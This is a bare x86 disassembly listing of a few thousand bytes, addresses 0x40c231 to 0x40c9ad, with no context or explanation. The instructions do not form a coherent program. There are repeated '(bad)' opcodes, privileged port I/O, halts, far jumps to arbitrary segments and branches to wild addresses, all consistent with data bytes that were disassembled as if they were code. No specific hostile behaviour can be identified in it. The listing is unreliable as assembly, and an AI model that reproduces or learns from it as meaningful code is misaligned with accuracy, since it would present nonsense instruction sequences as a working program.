  40c231:	loop   0x40c21a
  40c233:	mov    cs,WORD PTR [edx+0x0]
  40c236:	adc    BYTE PTR [edi],ah
  40c238:	add    eax,0xfb3954f3
  40c23d:	push   esi
  40c23e:	jmp    0x40c1c6
  40c240:	and    eax,0xc7c94ff2
  40c245:	ficomp WORD PTR [ebp+0x1e50416e]
  40c24b:	nop
  40c24c:	mov    ebp,ebx
  40c24e:	and    al,0x46
  40c250:	jae    0x40c2bb
  40c252:	adc    BYTE PTR [esi],al
  40c254:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c255:	and    al,BYTE PTR ds:0x6d6834ae
  40c25b:	sahf   
  40c25c:	add    eax,0xc69995b3
  40c261:	shl    BYTE PTR [edx+0x6c],0x2e
  40c265:	pop    ecx
  40c266:	adc    bl,bl
  40c268:	sahf   
  40c269:	xchg   ebp,eax
  40c26a:	jmp    0x327d:0xfa9fa85b
  40c271:	mov    cs,WORD PTR [edx]
  40c273:	es mov ebp,0x899fccf
  40c279:	xchg   ebx,eax
  40c27a:	daa    
  40c27b:	add    bl,BYTE PTR [esp+edx*8-0x50]
  40c27f:	pop    esi
  40c280:	mov    cl,0x37
  40c282:	add    al,0xd9
  40c284:	shl    esp,0x44
  40c287:	jp     0x40c214
  40c289:	xor    BYTE PTR [ebx-0x27],cl
  40c28c:	out    dx,al
  40c28d:	and    BYTE PTR [edx],ah
  40c28f:	addr16 int3 
  40c291:	mov    cs,WORD PTR [edx]
  40c293:	sar    edi,cl
  40c295:	add    ebp,DWORD PTR [ebx+0x58]
  40c298:	dec    esi
  40c299:	mov    eax,ds:0x7cb44bec
  40c29e:	push   ss
  40c29f:	or     DWORD PTR [esp+eiz*2+0x29b23fc7],esi
  40c2a6:	and    eax,0x401be80b
  40c2ab:	cmp    DWORD PTR [ecx-0x6b817db0],eax
  40c2b1:	push   0x24
  40c2b3:	push   edx
  40c2b4:	leave  
  40c2b5:	jmp    0x699cd632
  40c2ba:	mov    esi,0xe3049a68
  40c2bf:	inc    edx
  40c2c0:	push   edx
  40c2c1:	ss pop ds
  40c2c3:	push   eax
  40c2c4:	inc    ebx
  40c2c5:	test   eax,0x9b9381ab
  40c2ca:	fwait
  40c2cb:	rcl    ebp,cl
  40c2cd:	sbb    al,0xfb
  40c2cf:	sub    DWORD PTR [ecx+eiz*8+0x54],esp
  40c2d3:	sub    eax,0x80ac3944
  40c2d8:	pop    ecx
  40c2d9:	cdq    
  40c2da:	or     edi,DWORD PTR [ecx]
  40c2dc:	aam    0xca
  40c2de:	shl    BYTE PTR [edi+0x3e],1
  40c2e1:	fmul   st(0),st
  40c2e3:	in     eax,0x35
  40c2e5:	out    dx,eax
  40c2e6:	cli    
  40c2e7:	xor    al,BYTE PTR [ebp+0x54]
  40c2ea:	ds scas eax,DWORD PTR es:[edi]
  40c2ec:	push   ds
  40c2ed:	push   edx
  40c2ee:	leave  
  40c2ef:	xchg   edi,eax
  40c2f0:	shl    ebx,0xaa
  40c2f3:	(bad)  
  40c2f4:	pop    esp
  40c2f5:	outs   dx,BYTE PTR ds:[esi]
  40c2f6:	push   edi
  40c2f7:	dec    esi
  40c2f8:	das    
  40c2f9:	int3   
  40c2fa:	push   cs
  40c2fb:	icebp  
  40c2fc:	in     eax,0xf7
  40c2fe:	out    dx,eax
  40c2ff:	mov    DWORD PTR [ecx-0x10a8e8f7],ecx
  40c305:	fld    QWORD PTR [eax+0x2f]
  40c308:	sub    edi,0x3c
  40c30b:	pop    ecx
  40c30c:	sahf   
  40c30d:	jne    0x40c334
  40c30f:	js     0x40c36f
  40c311:	xchg   edx,eax
  40c312:	rsqrtps xmm4,XMMWORD PTR ds:0xfc38cd8e
  40c319:	jge    0x40c2d6
  40c31b:	les    edx,FWORD PTR [ecx]
  40c31d:	pop    ebp
  40c31e:	sar    DWORD PTR [esi+0x54],1
  40c321:	pop    esi
  40c322:	sbb    dl,BYTE PTR [edi+0x56]
  40c325:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c326:	or     ebp,edx
  40c328:	jo     0x40c2f7
  40c32a:	mov    dl,bl
  40c32c:	or     eax,edx
  40c32e:	int3   
  40c32f:	imul   ebp,DWORD PTR [edx+edi*1],0x3b
  40c333:	or     eax,ebx
  40c335:	push   ss
  40c336:	bound  ebp,QWORD PTR [esi+0x448ff7c9]
  40c33c:	jg     0x40c3a8
  40c33e:	bound  edx,QWORD PTR [eax+0xc4ea10f]
  40c344:	test   bh,bl
  40c346:	jg     0x40c359
  40c348:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c349:	jge    0x40c2e0
  40c34b:	sbb    DWORD PTR ds:0xd155505b,esi
  40c351:	pushf  
  40c352:	mov    bl,0x17
  40c354:	sar    DWORD PTR [esi+0xe],cl
  40c357:	pop    esp
  40c358:	mov    edi,DWORD PTR [eax]
  40c35a:	sub    al,0xd6
  40c35c:	jne    0x40c381
  40c35e:	jmp    0xa03ff6dc
  40c363:	dec    ecx
  40c364:	mov    al,0x29
  40c366:	pushf  
  40c367:	sbb    esp,DWORD PTR [ebx]
  40c369:	dec    edx
  40c36a:	mov    DWORD PTR [edi],edi
  40c36c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c36d:	or     BYTE PTR [ebx-0x19be781b],al
  40c373:	cmp    al,0x4f
  40c375:	or     BYTE PTR [ebx-0x6b79ea52],ch
  40c37b:	popf   
  40c37c:	popa   
  40c37d:	rcl    edx,cl
  40c37f:	sahf   
  40c380:	mov    esp,0x15eb1245
  40c385:	(bad)  
  40c386:	outs   dx,DWORD PTR ds:[esi]
  40c387:	sbb    eax,DWORD PTR [ecx+0x7d303455]
  40c38d:	out    0xb3,eax
  40c38f:	jp     0x40c324
  40c391:	pushf  
  40c392:	push   ss
  40c393:	or     ah,BYTE PTR [edx-0x5fee43e1]
  40c399:	(bad)  
  40c39a:	xchg   esp,eax
  40c39b:	in     al,0x6b
  40c39d:	add    eax,0xeffb6d12
  40c3a2:	or     al,0x39
  40c3a4:	fdiv   DWORD PTR [ebp+0x74]
  40c3a7:	pop    ebp
  40c3a8:	inc    ecx
  40c3a9:	inc    edx
  40c3aa:	xchg   edi,eax
  40c3ab:	jae    0x40c356
  40c3ad:	or     esp,ebx
  40c3af:	adc    DWORD PTR [ebx],ebx
  40c3b1:	cmp    ebp,ebp
  40c3b3:	mov    WORD PTR [eax-0x2b],?
  40c3b6:	push   0x206df4b8
  40c3bb:	dec    ecx
  40c3bc:	test   DWORD PTR [edi],0xce5470b4
  40c3c2:	pop    ebp
  40c3c3:	or     eax,0x7514e483
  40c3c8:	(bad)  
  40c3c9:	dec    ebp
  40c3ca:	xor    cl,bh
  40c3cc:	xchg   esi,eax
  40c3cd:	std    
  40c3ce:	pop    ebx
  40c3cf:	or     bl,BYTE PTR [esp+esi*1+0x2ebcf354]
  40c3d6:	sahf   
  40c3d7:	and    al,0x8b
  40c3d9:	icebp  
  40c3da:	std    
  40c3db:	sahf   
  40c3dc:	cmp    eax,0x688be67
  40c3e1:	sbb    DWORD PTR [esi+ebp*1],edi
  40c3e4:	jmp    0xb90a:0x7942b5aa
  40c3eb:	mov    eax,ds:0x4cbf28f4
  40c3f0:	imul   ecx,DWORD PTR [edx-0x4fea9e5a],0xf0bc2185
  40c3fa:	das    
  40c3fb:	shl    BYTE PTR [esi+0x323ee524],0x16
  40c402:	inc    edx
  40c403:	xchg   DWORD PTR [esi+edx*2-0x74828f4e],esi
  40c40a:	loop   0x40c3fd
  40c40c:	jnp    0x40c3d5
  40c40e:	jnp    0x40c479
  40c410:	jne    0x40c438
  40c412:	inc    edx
  40c413:	xchg   ebp,eax
  40c414:	add    cl,dh
  40c416:	push   ecx
  40c417:	push   ebx
  40c418:	aam    0x1b
  40c41a:	pop    edi
  40c41b:	pushf  
  40c41c:	or     ebx,edx
  40c41e:	sbb    eax,0xad00844b
  40c423:	sbb    BYTE PTR cs:[bx],al
  40c427:	push   0x83e7a9cd
  40c42c:	and    BYTE PTR [esi],bh
  40c42e:	and    ah,BYTE PTR ds:0x299f13ee
  40c434:	add    DWORD PTR [edx+0x55d9e51e],esi
  40c43a:	inc    ebp
  40c43b:	jmp    0x40c47d
  40c43d:	dec    esi
  40c43e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c43f:	aaa    
  40c440:	inc    eax
  40c441:	add    BYTE PTR [eax-0x3500195],al
  40c447:	imul   eax,DWORD PTR [edi+0xf6395fe],0x9f8cac02
  40c451:	mov    dh,0xe2
  40c453:	lods   al,BYTE PTR ds:[esi]
  40c454:	add    esp,0xae9ced6d
  40c45a:	stc    
  40c45b:	call   0x3b7ba2
  40c460:	and    al,cl
  40c462:	lds    ebx,FWORD PTR [edx+0x156665fe]
  40c468:	jmp    0x7760:0xdbd9439d
  40c46f:	aas    
  40c470:	leave  
  40c471:	ins    BYTE PTR es:[edi],dx
  40c472:	int3   
  40c473:	dec    eax
  40c474:	leave  
  40c475:	xor    eax,0x3b016043
  40c47a:	out    dx,eax
  40c47b:	jp     0x40c4e6
  40c47d:	mov    dh,0x8b
  40c47f:	or     al,0x53
  40c481:	cmc    
  40c482:	or     DWORD PTR ds:0x75f50511,ebp
  40c488:	pusha  
  40c489:	jae    0x40c4b0
  40c48b:	adc    BYTE PTR [ebp-0x1cdb00d6],0x61
  40c492:	xchg   esi,eax
  40c493:	adc    eax,0x4d505d8
  40c498:	das    
  40c499:	xchg   BYTE PTR [ebp-0x5b3809d],al
  40c49f:	jl     0x40c515
  40c4a1:	mov    eax,0x2493f8e5
  40c4a6:	xchg   esi,eax
  40c4a7:	xchg   ecx,ebp
  40c4a9:	mov    esi,0x1f171e36
  40c4ae:	pop    ecx
  40c4af:	sub    DWORD PTR [ebx+ecx*8+0x62e83c14],esi
  40c4b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4b7:	clc    
  40c4b8:	pop    ecx
  40c4b9:	sbb    esp,DWORD PTR ds:0x704d3473
  40c4bf:	ret    0xb3de
  40c4c2:	iret   
  40c4c3:	icebp  
  40c4c4:	sub    al,0xab
  40c4c6:	xor    al,BYTE PTR [ebp+0x6b]
  40c4c9:	mov    ah,0x26
  40c4cb:	test   BYTE PTR [ecx+0x684515e8],dl
  40c4d1:	mov    eax,ds:0x83b39de9
  40c4d6:	aaa    
  40c4d7:	mov    edx,0x29d556b9
  40c4dc:	mov    ch,0x51
  40c4de:	dec    esi
  40c4df:	mov    dh,BYTE PTR [ebx-0x3f2d68df]
  40c4e5:	push   esi
  40c4e6:	cmp    esp,ecx
  40c4e8:	pop    ds
  40c4e9:	popf   
  40c4ea:	imul   edx,DWORD PTR [ebx],0xaf947340
  40c4f0:	jmp    0x40c4e5
  40c4f2:	push   cs
  40c4f3:	clc    
  40c4f4:	retf   0xe955
  40c4f7:	loope  0x40c4cc
  40c4f9:	ret    
  40c4fa:	lods   al,BYTE PTR ds:[esi]
  40c4fb:	neg    BYTE PTR ds:0x2d71e658
  40c501:	fidiv  DWORD PTR [eax]
  40c503:	test   eax,0xf3d47bb2
  40c508:	out    0x90,eax
  40c50a:	xor    BYTE PTR [eax+0x2d61e705],0xba
  40c511:	into   
  40c512:	push   edx
  40c513:	sbb    al,0x89
  40c515:	add    eax,0x1bec1443
  40c51a:	add    BYTE PTR [eax*1-0x67232229],0x31
  40c522:	imul   ecx,DWORD PTR [ecx],0x707966b
  40c528:	iret   
  40c529:	cdq    
  40c52a:	mov    bh,0xfe
  40c52c:	fild   DWORD PTR [ebp-0xc7cbe99]
  40c532:	push   esi
  40c533:	shl    edi,0x14
  40c536:	push   ecx
  40c537:	test   al,0xb4
  40c539:	xchg   DWORD PTR [ebx],esi
  40c53b:	jl     0x40c599
  40c53d:	jg     0x40c529
  40c53f:	xchg   DWORD PTR [edx],esi
  40c541:	mov    ah,0x52
  40c543:	jge    0x40c584
  40c545:	mov    bh,0x63
  40c547:	mov    al,ds:0x507542b5
  40c54c:	inc    ebx
  40c54d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c54e:	iret   
  40c54f:	jno    0x40c513
  40c551:	sub    DWORD PTR [esi-0x77710db6],eax
  40c557:	xor    cl,BYTE PTR [ecx-0xc]
  40c55a:	pop    es
  40c55b:	cmp    BYTE PTR [edi+ebp*4],bh
  40c55e:	inc    edx
  40c55f:	leave  
  40c560:	jp     0x40c550
  40c562:	ror    ebx,1
  40c564:	sub    DWORD PTR [eax-0x7771e34d],0x32
  40c56b:	les    ecx,FWORD PTR [edx]
  40c56d:	add    ah,BYTE PTR [edx-0x6f]
  40c570:	sub    dh,ch
  40c572:	loop   0x40c5ca
  40c574:	mov    edi,0xf7b45988
  40c579:	aaa    
  40c57a:	cmp    BYTE PTR ds:0xf2fc2251,0x81
  40c581:	adc    dh,BYTE PTR ds:0x8afbafda
  40c587:	mov    bh,0x85
  40c589:	jg     0x40c5b5
  40c58b:	jb     0x40c57c
  40c58d:	push   esp
  40c58e:	xchg   ecx,eax
  40c58f:	cwde   
  40c590:	or     ecx,edi
  40c592:	(bad)  
  40c593:	sti    
  40c594:	jo     0x40c5ee
  40c596:	lods   al,BYTE PTR ds:[esi]
  40c597:	aad    0x1b
  40c599:	std    
  40c59a:	adc    DWORD PTR [esi],0x8
  40c59d:	call   0x3a2a:0xbe0ec6fd
  40c5a4:	punpckhdq mm0,QWORD PTR [ebp-0x5f]
  40c5a8:	jb     0x40c606
  40c5aa:	add    eax,0xae6039ff
  40c5af:	ss call 0xa294:0xc7fb8704
  40c5b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5b8:	cdq    
  40c5b9:	je     0x40c635
  40c5bb:	mov    dl,0x70
  40c5bd:	inc    ecx
  40c5be:	inc    ebp
  40c5bf:	push   cs
  40c5c0:	mov    ebp,0x600f701c
  40c5c5:	fwait
  40c5c6:	xchg   ebp,eax
  40c5c7:	xor    bh,al
  40c5c9:	sbb    eax,0xe48d5af2
  40c5ce:	pop    eax
  40c5cf:	popa   
  40c5d0:	sbb    BYTE PTR [eax+0x664464b4],ch
  40c5d6:	retf   
  40c5d7:	(bad)  
  40c5d8:	in     eax,dx
  40c5d9:	dec    esi
  40c5da:	(bad)  
  40c5db:	jmp    FWORD PTR ds:0x75b406d9
  40c5e1:	lock pop ss
  40c5e3:	mov    al,ds:0xcc75e26e
  40c5e8:	(bad)  
  40c5e9:	sbb    BYTE PTR [edx],bh
  40c5eb:	jo     0x40c628
  40c5ed:	jbe    0x40c5eb
  40c5ef:	outs   dx,DWORD PTR ds:[esi]
  40c5f0:	dec    esi
  40c5f1:	sahf   
  40c5f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5f3:	clc    
  40c5f4:	pop    edx
  40c5f5:	test   al,0x2a
  40c5f7:	xchg   ebx,eax
  40c5f8:	fcmovnbe st,st(6)
  40c5fa:	jmp    0x40c596
  40c5fc:	ins    DWORD PTR es:[edi],dx
  40c5fd:	popa   
  40c5fe:	das    
  40c5ff:	mov    ebx,0x2b3e4ff6
  40c604:	mov    ds:0x8e1a96dd,al
  40c609:	adc    al,0x89
  40c60b:	loop   0x40c668
  40c60d:	test   DWORD PTR [ebp-0x6b],edx
  40c610:	mov    eax,ds:0x47b0a7dc
  40c615:	mov    ebp,DWORD PTR [edx-0x6d]
  40c618:	ret    0x168a
  40c61b:	mov    ebx,0x705b6f14
  40c620:	sbb    ch,BYTE PTR [edi]
  40c622:	push   ebp
  40c623:	sbb    ecx,eax
  40c625:	rcl    BYTE PTR [ebx-0x55],1
  40c628:	fisub  DWORD PTR [esi+0x2bdfe226]
  40c62e:	loopne 0x40c61f
  40c630:	cld    
  40c631:	sbb    al,0x68
  40c633:	je     0x40c67b
  40c635:	or     al,0x10
  40c637:	mov    dl,0xba
  40c639:	jmp    0xc347:0x204034bb
  40c640:	xchg   ebx,eax
  40c641:	push   esp
  40c642:	and    BYTE PTR [ecx+0x9],dl
  40c645:	fisttp DWORD PTR [ebx-0x17]
  40c648:	je     0x40c69f
  40c64a:	push   esp
  40c64b:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40c64d:	ja     0x40c66c
  40c64f:	inc    eax
  40c650:	jno    0x40c66f
  40c652:	pop    ss
  40c653:	sti    
  40c654:	mov    ds:0x4f0473a5,al
  40c659:	mov    ebx,0x83f0c2b6
  40c65e:	mov    edi,0x2c9bd9a9
  40c663:	outs   dx,BYTE PTR ds:[esi]
  40c664:	adc    eax,0x261d210b
  40c669:	inc    ecx
  40c66a:	call   0x5e54:0x36ff7af9
  40c671:	scas   al,BYTE PTR es:[edi]
  40c672:	cmp    ebx,DWORD PTR [eax-0x33f59108]
  40c678:	dec    eax
  40c679:	scas   al,BYTE PTR es:[edi]
  40c67a:	inc    BYTE PTR [esi-0x6da24a57]
  40c680:	cmp    al,0x4d
  40c682:	mov    eax,ds:0xab9693a5
  40c687:	push   ebx
  40c688:	cmc    
  40c689:	ror    BYTE PTR [esi-0x38],cl
  40c68c:	nop
  40c68d:	jle    0x40c6f5
  40c68f:	mov    eax,ds:0x6184287a
  40c694:	and    eax,DWORD PTR [eax+0x62433a0a]
  40c69a:	fstp   DWORD PTR [eax+0x17dedb52]
  40c6a0:	sub    ch,BYTE PTR [eax]
  40c6a2:	hlt    
  40c6a3:	and    al,BYTE PTR [edi+0x7865e951]
  40c6a9:	inc    ecx
  40c6aa:	outs   dx,DWORD PTR ds:[esi]
  40c6ab:	aas    
  40c6ac:	int3   
  40c6ad:	jmp    0x111d:0x56f85e0f
  40c6b4:	out    dx,al
  40c6b5:	dec    esi
  40c6b6:	fdivr  DWORD PTR [esi+0x21f55dd2]
  40c6bc:	xchg   esp,eax
  40c6bd:	sbb    eax,0x35afefec
  40c6c2:	aam    0xea
  40c6c4:	xchg   ecx,eax
  40c6c5:	cdq    
  40c6c6:	xchg   esi,eax
  40c6c7:	pop    edx
  40c6c8:	fwait
  40c6c9:	rol    BYTE PTR [ebx],1
  40c6cb:	rcl    DWORD PTR [ebx],1
  40c6cd:	push   0xe3e5c1fd
  40c6d2:	inc    edx
  40c6d3:	add    esp,DWORD PTR [eax-0x13cc9379]
  40c6d9:	mov    BYTE PTR [edi+0x19],al
  40c6dc:	cmp    bl,BYTE PTR [ebx+esi*4+0x7fd5a71f]
  40c6e3:	jl     0x40c691
  40c6e5:	es jecxz 0x40c70f
  40c6e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6e9:	mov    eax,ds:0x240b13aa
  40c6ee:	inc    ebx
  40c6ef:	imul   ebx,DWORD PTR [ebx-0x6b],0xffffffa8
  40c6f3:	sbb    esi,DWORD PTR [ebx-0x6d]
  40c6f6:	lds    edx,FWORD PTR [edx-0x3a48218]
  40c6fc:	int3   
  40c6fd:	sbb    BYTE PTR [ecx-0x306151f9],al
  40c703:	adc    edi,ebx
  40c705:	xchg   edx,eax
  40c706:	mov    ?,WORD PTR [edi]
  40c708:	or     al,0xe3
  40c70a:	add    al,0xd6
  40c70c:	jmp    0x40c755
  40c70e:	leave  
  40c70f:	or     DWORD PTR [ebx],ebp
  40c711:	stos   BYTE PTR es:[edi],al
  40c712:	dec    ebp
  40c713:	out    dx,al
  40c714:	xchg   edi,eax
  40c715:	adc    BYTE PTR [edx+0x61],0x69
  40c719:	jno    0x40c749
  40c71b:	bnd je 0x40c71a
  40c71e:	out    0x24,al
  40c720:	(bad)  
  40c721:	xor    eax,0xf233df00
  40c726:	pop    esp
  40c727:	es or  al,0xeb
  40c72a:	jle    0x40c6b6
  40c72c:	std    
  40c72d:	stc    
  40c72e:	push   esp
  40c72f:	arpl   sp,ax
  40c731:	cmp    al,0xa2
  40c733:	mov    WORD PTR [edx+0x2f],ds
  40c736:	ds cmp ebx,esi
  40c739:	rcr    ah,1
  40c73b:	mov    ebx,0x8390e8b2
  40c740:	xchg   ecx,eax
  40c741:	stos   DWORD PTR es:[edi],eax
  40c742:	mov    DWORD PTR [ebp+0x7],esp
  40c745:	or     eax,0x1f64064f
  40c74a:	mov    ch,0x32
  40c74c:	adc    ah,BYTE PTR [ecx-0x7b]
  40c74f:	fs push cs
  40c751:	jp     0x40c79f
  40c753:	daa    
  40c754:	femms  
  40c756:	mov    DWORD PTR [esp+ebp*1+0x39],eax
  40c75a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c75b:	or     DWORD PTR [esi+ecx*8],esi
  40c75e:	xchg   ebp,eax
  40c75f:	push   edx
  40c760:	mov    al,0x19
  40c762:	cmp    BYTE PTR [ebx-0x52],ch
  40c765:	cmp    ebp,DWORD PTR [edx+0x19]
  40c768:	adc    dl,dl
  40c76a:	cli    
  40c76b:	stos   BYTE PTR es:[edi],al
  40c76c:	aam    0xc9
  40c76e:	loopne 0x40c71d
  40c770:	jnp    0x40c7ee
  40c772:	mov    DWORD PTR [esi-0x5c62768a],esp
  40c778:	sub    DWORD PTR [edx+0xfbf50f2],0x3
  40c77f:	les    esi,FWORD PTR [edi+0x658e1dbd]
  40c785:	out    dx,al
  40c786:	or     DWORD PTR [eax+0x57],ebp
  40c789:	mov    esp,0x20ead414
  40c78e:	inc    ecx
  40c78f:	mov    dl,0xb6
  40c791:	dec    ebx
  40c792:	mov    cl,0x22
  40c794:	dec    edi
  40c795:	(bad)  
  40c796:	mov    al,ds:0x3316aa7
  40c79b:	pop    ds
  40c79c:	addr16 out dx,al
  40c79e:	rcl    DWORD PTR [edx-0x1],1
  40c7a1:	shr    BYTE PTR [ecx],0xe8
  40c7a4:	push   esi
  40c7a5:	xlat   BYTE PTR ds:[ebx]
  40c7a6:	sub    DWORD PTR [edi-0x5156cfd6],edi
  40c7ac:	arpl   ax,dx
  40c7ae:	add    eax,0xbdffd3be
  40c7b3:	or     BYTE PTR ds:0xb9553feb,dl
  40c7b9:	push   ss
  40c7ba:	cdq    
  40c7bb:	sar    BYTE PTR [esi-0x36e85a71],0x4e
  40c7c2:	(bad)  
  40c7c3:	test   edi,0x432dcdaf
  40c7c9:	pusha  
  40c7ca:	inc    edx
  40c7cb:	icebp  
  40c7cc:	push   ecx
  40c7cd:	jb     0x40c753
  40c7cf:	push   es
  40c7d0:	adc    BYTE PTR ds:0x8c2cb4ab,ah
  40c7d6:	imul   BYTE PTR [ebx+0x74087abc]
  40c7dc:	call   0x17ab:0x73036196
  40c7e3:	pusha  
  40c7e4:	sbb    BYTE PTR ds:0x6af26350,bl
  40c7ea:	stos   BYTE PTR es:[edi],al
  40c7eb:	frstor [eax]
  40c7ed:	cld    
  40c7ee:	or     dl,BYTE PTR [ebp-0x4c]
  40c7f1:	imul   ebx,DWORD PTR [esi-0x28],0xffffffee
  40c7f5:	or     ch,BYTE PTR [ecx]
  40c7f7:	pop    ebp
  40c7f8:	fadd   st,st(0)
  40c7fa:	adc    al,0xcb
  40c7fc:	(bad)  
  40c7fd:	jp     0x40c83e
  40c7ff:	aad    0x7c
  40c801:	adc    eax,0x99760e99
  40c806:	push   0x51928994
  40c80b:	popf   
  40c80c:	mov    esp,es
  40c80e:	pop    esi
  40c80f:	push   0x9cc60657
  40c814:	add    cl,BYTE PTR [ecx]
  40c816:	in     eax,0xf7
  40c818:	mov    eax,0x7c2ce81b
  40c81d:	jne    0x40c85c
  40c81f:	outs   dx,DWORD PTR ds:[esi]
  40c820:	xchg   ebp,eax
  40c821:	xchg   ebx,eax
  40c822:	outs   dx,DWORD PTR ds:[esi]
  40c823:	loop   0x40c870
  40c825:	in     al,0x42
  40c827:	inc    edi
  40c828:	int3   
  40c829:	adc    al,0x56
  40c82b:	jb     0x40c86d
  40c82d:	in     eax,dx
  40c82e:	dec    esi
  40c82f:	xchg   BYTE PTR [ebx-0x43921c53],dh
  40c835:	jp     0x40c837
  40c837:	out    dx,eax
  40c838:	shl    BYTE PTR [edi+ecx*8+0x30f81f44],cl
  40c83f:	xchg   DWORD PTR [eax+0x32],eax
  40c842:	mov    ebp,0xd593f841
  40c847:	addr16 popa 
  40c849:	push   cs
  40c84a:	adc    eax,DWORD PTR gs:[ecx-0x32]
  40c84e:	xor    edi,DWORD PTR [eax+ebx*1]
  40c851:	rcl    eax,1
  40c853:	push   ecx
  40c854:	je     0x40c819
  40c856:	les    esp,FWORD PTR [ecx-0x70]
  40c859:	or     eax,0x52e60485
  40c85e:	sbb    al,0x9e
  40c860:	sbb    al,0xc
  40c863:	sub    bl,BYTE PTR [ecx-0x6e]
  40c866:	fld    DWORD PTR [ebx]
  40c868:	mov    esp,0x2c052548
  40c86d:	mov    ds:0xb5918daa,al
  40c872:	bound  esp,QWORD PTR [ebp-0x18]
  40c875:	aas    
  40c876:	out    0xe3,al
  40c878:	ret    
  40c879:	mov    ds:0x283e44d9,eax
  40c87e:	out    dx,al
  40c87f:	iret   
  40c880:	xlat   BYTE PTR ds:[ebx]
  40c881:	enter  0xcaf8,0xe2
  40c885:	out    dx,eax
  40c886:	xor    esi,DWORD PTR [esi]
  40c888:	mov    eax,ds:0xb34f320
  40c88d:	push   edx
  40c88e:	sbb    al,0xa5
  40c890:	in     eax,0x1e
  40c892:	ret    0x98fd
  40c895:	push   0xf6983b2f
  40c89a:	push   esp
  40c89b:	cld    
  40c89c:	stos   BYTE PTR es:[edi],al
  40c89d:	push   ebp
  40c89e:	sbb    eax,0x62ea86dc
  40c8a3:	mov    bl,dh
  40c8a5:	in     eax,dx
  40c8a6:	inc    ebp
  40c8a7:	dec    esi
  40c8a8:	int    0xf3
  40c8aa:	xor    al,0x13
  40c8ac:	or     edi,DWORD PTR [ebx-0xb]
  40c8af:	dec    esp
  40c8b0:	jmp    0x40c8b3
  40c8b2:	mov    ds:0x6dd54e35,al
  40c8b7:	push   0x5fccbbff
  40c8bc:	jo     0x40c8c1
  40c8be:	cmp    BYTE PTR [esi-0x37],ah
  40c8c1:	int3   
  40c8c2:	int3   
  40c8c3:	popf   
  40c8c4:	into   
  40c8c5:	les    eax,FWORD PTR [edi+0x1e12d858]
  40c8cb:	(bad)  
  40c8cc:	popf   
  40c8cd:	ins    DWORD PTR es:[edi],dx
  40c8ce:	xor    al,0x81
  40c8d0:	mov    DWORD PTR [ecx+0x38],ecx
  40c8d3:	icebp  
  40c8d4:	dec    eax
  40c8d5:	fdivr  st,st(4)
  40c8d7:	leave  
  40c8d8:	cmp    al,BYTE PTR [eax-0x4f5d251e]
  40c8de:	fisubr DWORD PTR [ecx]
  40c8e0:	push   0x30
  40c8e2:	or     BYTE PTR [edi+0x777856a0],dh
  40c8e8:	push   cs
  40c8e9:	cmp    bh,0x56
  40c8ec:	xor    ebp,edi
  40c8ee:	jmp    0x40c927
  40c8f0:	fcmovbe st,st(6)
  40c8f2:	aaa    
  40c8f3:	or     eax,0x62fe04af
  40c8f8:	mov    ah,0x26
  40c8fa:	fst    QWORD PTR [esi]
  40c8fc:	or     ecx,edx
  40c8fe:	and    ch,BYTE PTR [ebx+edx*4]
  40c901:	aam    0x34
  40c903:	pop    esi
  40c904:	(bad)  [edx-0x77]
  40c907:	scas   al,BYTE PTR es:[edi]
  40c908:	xor    esi,DWORD PTR [ebp-0x39]
  40c90b:	outs   dx,BYTE PTR ds:[esi]
  40c90c:	mov    bl,0x96
  40c90e:	fisubr DWORD PTR [edx]
  40c910:	lods   eax,DWORD PTR ds:[esi]
  40c911:	ins    DWORD PTR es:[edi],dx
  40c912:	shr    DWORD PTR [edx+esi*8+0x5648ba6f],cl
  40c919:	push   ss
  40c91a:	fstp   DWORD PTR [edx]
  40c91c:	pop    eax
  40c91d:	jnp    0x40c99c
  40c91f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c920:	cmp    al,0x52
  40c922:	pusha  
  40c923:	bsr    esp,edi
  40c926:	pushf  
  40c927:	rol    dl,0x5b
  40c92a:	pop    ebp
  40c92b:	mov    ch,0xb6
  40c92d:	enter  0xe30e,0x91
  40c931:	push   cs
  40c932:	pop    esp
  40c933:	mov    edx,0x966c19b4
  40c938:	lods   eax,DWORD PTR ds:[esi]
  40c939:	sbb    DWORD PTR [eax],0xffffffc4
  40c93c:	dec    esp
  40c93d:	add    BYTE PTR [esi+ebp*2],ch
  40c940:	add    DWORD PTR ds:0xe31f8054,edx
  40c946:	or     BYTE PTR [edi+0x617cb4bc],dl
  40c94c:	sub    eax,0xaa3001dc
  40c951:	mov    ah,0x3a
  40c953:	lds    edi,FWORD PTR [edx+0x0]
  40c956:	mov    dl,0x1c
  40c958:	pop    ebp
  40c959:	adc    al,0xb2
  40c95b:	leave  
  40c95c:	jns    0x40c92b
  40c95e:	mov    ch,0x31
  40c960:	jecxz  0x40c968
  40c962:	push   ebp
  40c963:	iret   
  40c964:	xchg   ebp,eax
  40c965:	jae    0x40c924
  40c967:	xchg   ebp,eax
  40c968:	call   0xdaa4c502
  40c96d:	mov    DWORD PTR [eax-0x20d13366],0xff0c4eb5
  40c977:	mov    ecx,0x6c845fb2
  40c97c:	xor    bl,BYTE PTR [di]
  40c97f:	or     eax,0x38fca858
  40c984:	jmp    0x40c960
  40c986:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c987:	add    dl,bh
  40c989:	mov    edi,0xe62e41ab
  40c98e:	imul   esp,DWORD PTR [eax-0x4d],0x1f655a6c
  40c995:	rcr    eax,1
  40c997:	(bad)  
  40c998:	popa   
  40c999:	inc    edi
  40c99a:	mov    bh,BYTE PTR ds:0xfdf2aee2
  40c9a0:	sub    al,0x9f
  40c9a2:	jnp    0x40c954
  40c9a4:	call   DWORD PTR [edx]
  40c9a6:	fs out dx,eax
  40c9a8:	dec    esi
  40c9a9:	inc    ebx
  40c9aa:	dec    ebx
  40c9ab:	jae    0x40c99d
  40c9ad:	mov    edi,0xb6840add
